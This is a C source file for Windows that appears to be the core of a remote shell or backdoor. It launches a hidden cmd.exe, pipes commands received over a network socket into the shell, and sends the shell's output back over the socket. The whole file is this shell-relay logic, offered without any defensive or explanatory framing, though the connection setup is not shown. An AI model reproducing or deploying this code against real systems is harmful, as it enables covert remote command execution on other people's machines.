#include <tchar.h>
#include <strsafe.h>
#include <WinSock2.h>
#include <Ws2tcpip.h> // We will use this for InetPton()


/* Typedefs */
typedef HANDLE PIPE;

typedef struct
{
	SOCKET client;

	PIPE hProcRead;
	PIPE hProcWrite;

	CHAR chProcBuff[1024];
	CHAR chSockBuff[1024];

	DWORD dwProcRead;
	DWORD dwSockRead;

	HANDLE hThread;
	HANDLE hProcess;
	BOOL bRunning;
} ClientState, * PClientState;


/* Declarations */
void ErrorExit(const TCHAR* lpszFunction);
BOOL ReadFromSocket(ClientState* state);
BOOL OnProcessOutput(ClientState* state);
BOOL OnSocketOutput(ClientState* state);
void CleanUp(ClientState* state);

/* Global Variables */
HANDLE g_hReadProcThread;

BOOL OnProcessOutput(ClientState* state)
{
	if (state == NULL)
	{
		ErrorExit(_T("null state pointer"));
		return FALSE;
	}

	if (!state->bRunning)
		return FALSE;

	DWORD sent = 0;
	while (sent < state->dwProcRead && (int)sent != SOCKET_ERROR)
	{
		sent += send(state->client, state->chProcBuff + sent, state->dwProcRead - sent, 0);
		if ((int)sent == SOCKET_ERROR)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL OnSocketOutput(ClientState* state)
{
	if (state == NULL)
		ErrorExit(_T("null state pointer"));

	if (!state->bRunning)
		return FALSE;

	DWORD dwWrite, dwTotalWritten = 0;
	BOOL bSuccess = FALSE;

	while (dwTotalWritten < state->dwSockRead)
	{
		bSuccess = WriteFile(state->hProcWrite, state->chSockBuff + dwTotalWritten, state->dwSockRead - dwTotalWritten,
			&dwWrite, NULL);
		if (!bSuccess)
		{
			shutdown(state->client, SD_BOTH);
			closesocket(state->client);
			return FALSE;
		}
		dwTotalWritten += dwWrite;
	}

	const HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	dwTotalWritten = 0;

	if (hStdOut != INVALID_HANDLE_VALUE)
	{
		while (dwTotalWritten < state->dwSockRead)
		{
			bSuccess = WriteFile(hStdOut, state->chSockBuff + dwTotalWritten, state->dwSockRead - dwTotalWritten,
				&dwWrite, NULL);
			if (!bSuccess)break;
			dwTotalWritten += dwWrite;
		}
	}
	return TRUE;
}

DWORD WINAPI ReadFromProcess(ClientState* state)
{
	BOOL bSuccess = FALSE;

	while (state->bRunning)
	{
		bSuccess = ReadFile(state->hProcRead, state->chProcBuff, 1024, &state->dwProcRead, NULL);
		if (!bSuccess || state->dwProcRead == 0) break;

		OnProcessOutput(state);
		if (!bSuccess) break;

		state->chProcBuff[strlen("exit")] = '\0';
		if (_strcmpi(state->chProcBuff, "exit") == 0)
		{
			state->bRunning = FALSE;
			shutdown(state->client, SD_BOTH);
			closesocket(state->client);
			return 0;
		}
	}
	return 0;
}

BOOL StartProcessAsync(ClientState* state)
{
	//Process Setup
	SECURITY_ATTRIBUTES secAttrs;
	STARTUPINFO sInfo = { 0 };
	PROCESS_INFORMATION pInfo = { 0 };
	PIPE hProcInRead, hProcInWrite, hProcOutRead, hProcOutWrite;
	TCHAR cmdPath[MAX_PATH];

	secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttrs.bInheritHandle = TRUE;
	secAttrs.lpSecurityDescriptor = NULL;


	if (!CreatePipe(&hProcInRead, &hProcInWrite, &secAttrs, 0))
		ErrorExit(TEXT("hProcIn CreatePipe"));

	// Ensure the write handle to the pipe for STDIN is not inherited. 
	// The Child Process does not have to be able
	// to WRITE to input, it only needs to READ from the input.
	if (!SetHandleInformation(hProcInWrite, HANDLE_FLAG_INHERIT, 0))
		ErrorExit(TEXT("StdIn SetHandleInformation"));

	if (!CreatePipe(&hProcOutRead, &hProcOutWrite, &secAttrs, 0))
		ErrorExit(TEXT("hProcOut CreatePipe"));

	// Ensure the write handle to the pipe for STDOUT is not inherited.
	// The Child Process does not have to be able
	// to READ from output, it only needs to WRITE to the output.
	if (!SetHandleInformation(hProcOutRead, HANDLE_FLAG_INHERIT, 0))
		ErrorExit(TEXT("StdIn SetHandleInformation"));

	GetEnvironmentVariable(_T("ComSpec"), cmdPath, sizeof(cmdPath));

	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.wShowWindow = SW_HIDE;

	// Setup Redirection
	sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	sInfo.hStdInput = hProcInRead;
	// process will be writing output into the writing side of the pipe we will be reading from using the reading side.
	sInfo.hStdOutput = hProcOutWrite;
	// process will be writing errors into the writing side of the pipe we will be reading from using the reading side.
	sInfo.hStdError = hProcOutWrite;

	CreateProcess(NULL,
		cmdPath,
		&secAttrs,
		&secAttrs,
		TRUE, // Inherit Handles(Including PIPES)
		0,
		NULL,
		NULL,
		&sInfo, &pInfo);

	state->hProcRead = hProcOutRead;
	state->hProcWrite = hProcInWrite;
	state->hThread = pInfo.hThread;
	state->hProcess = pInfo.hProcess;

	g_hReadProcThread = CreateThread(&secAttrs, 0,
		(LPTHREAD_START_ROUTINE)ReadFromProcess,
		state, 0, NULL);

	return TRUE;
}

BOOL ReadFromSocket(ClientState* state)
{
	while (state->bRunning)
	{
		state->dwSockRead = recv(state->client, state->chSockBuff, 1024, 0);
		if ((int)state->dwSockRead == SOCKET_ERROR)
		{
			state->bRunning = FALSE;
			return FALSE;
		}
		OnSocketOutput(state);
	}
	return TRUE;
}

void ErrorExit(const TCHAR* lpszFunction)
// Format a readable error message, display a message box, 
// and exit from the application.
{
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(
			TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(1);
}
